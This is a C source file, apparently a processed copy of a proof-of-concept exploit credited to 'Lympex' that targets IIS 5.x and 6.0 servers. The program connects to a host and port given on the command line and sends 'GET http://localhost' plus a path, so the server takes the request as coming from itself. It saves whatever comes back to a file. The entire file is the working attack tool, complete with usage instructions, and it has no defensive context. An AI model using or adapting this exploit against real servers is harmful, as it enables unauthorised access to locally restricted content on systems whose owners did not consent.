
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int FILE ;


 int Conectado ;
 int LEN_BUF ;
 int WSACleanup () ;
 scalar_t__ atoi (char*) ;
 int fclose (int *) ;
 int * fopen (char*,char*) ;
 int fputs (char*,int *) ;
 int printf (char*,...) ;
 size_t recv (int,char*,int,int ) ;
 int send (int,char*,int ,int ) ;
 int strcat (char*,char*) ;
 int strcpy (char*,char*) ;
 int strlen (char*) ;

void main(int argc, char *argv[])
{

 int Conecta(char *Host, short puerto);

 int socket;

 char buf[LEN_BUF];
 FILE *data;

 printf("\n                 Proof of Concept");
 printf("\n IIS 5.x and IIS 6.0 Server Name Spoof - by Lympex");
 printf("\nContact: lympex[at]gmail[dot]com - http://l-bytes.tk");
 printf("\n----------------------------------------------------\n");

 if(argc!=4)
 {
  printf("\n[+] Usage: %s server.com 80 /test.asp\n",argv[0]);return;
 }


 socket=Conecta(argv[1],(short)atoi(argv[2]));

 if(socket==-1)
 {
  printf("\n[+] Error connecting to host\n");
  return;
 }printf("\n[+] Connected!\n");

 if((data=fopen("received_data.txt","w"))==((void*)0))
 {
  printf("\n[+] Error saving received data\n");
  WSACleanup();
  return;
 }


 strcpy(buf,"GET http://localhost");strcat(buf,argv[3]);strcat(buf," HTTP/1.0\n\n");
 send(socket,buf,strlen(buf),0);


 do
 {
  buf[recv(socket,buf,LEN_BUF,0)]='\0';
  fputs(buf,data);
 }while(socket==Conectado);

 WSACleanup();
 fclose(data);
 printf("\n[+] Received data, saved in: \x22received_data.txt\x22\n");
 return;
}
